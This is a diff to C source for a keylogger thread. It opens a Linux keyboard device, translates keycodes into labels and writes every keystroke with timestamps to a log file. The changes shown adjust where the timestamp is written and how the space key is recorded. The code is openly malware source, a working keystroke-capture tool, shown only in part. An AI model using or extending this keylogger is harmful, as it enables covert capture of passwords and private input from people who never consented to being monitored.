@@ -23,6 +23,7 @@
 
 /*  file_log all keyboard keys exept when shift left or right is used.
     Add the date and hours of all keyboard event in the file_log file */
+
 void *keylogger(char *deviceFile)
 {
     /* Vars for keylogger */
@@ -47,18 +48,16 @@ void *keylogger(char *deviceFile)
         error("fopen()\nFonction : keylogger()");
 
     printf("deviceFile : %s\n\n", deviceFile);
-    
-/*
- write the date of the event
-*/  fputs("\n\n", file_log);
-    fputs(buffer, file_log);
-    fputs("\n\n", file_log);
 
     fd = open(deviceFile, O_RDONLY);
     if(fd == -1)
         error("open()\nFonction : open_kb_device() 1");
 
     setbuf(file_log, NULL);
+    
+    fputs("\n\n", file_log);
+    fputs(buffer, file_log);
+    fputs(" : ", file_log);
 
     while(1)
     {
@@ -135,7 +134,7 @@ void *keylogger(char *deviceFile)
 
                 case 55 : fputs("[Pav num.] * ", file_log);   break;
                 case 56 : fputs("[LAlt] ", file_log);   break;
-                case 57 : fputs("[Space] ", file_log); break;
+/* Space */     case 57 : fputs(" ", file_log); break;
                 case 58 : fputs("[Capslock] ", file_log);   break;
                 case 59 : fputs("F1 ", file_log);   break;
                 case 60 : fputs("F2 ", file_log);   break;
@@ -188,7 +187,7 @@ void *keylogger(char *deviceFile)
             }
         }
     }
-
+    
     fclose(file_log);
 
     pthread_exit(NULL);
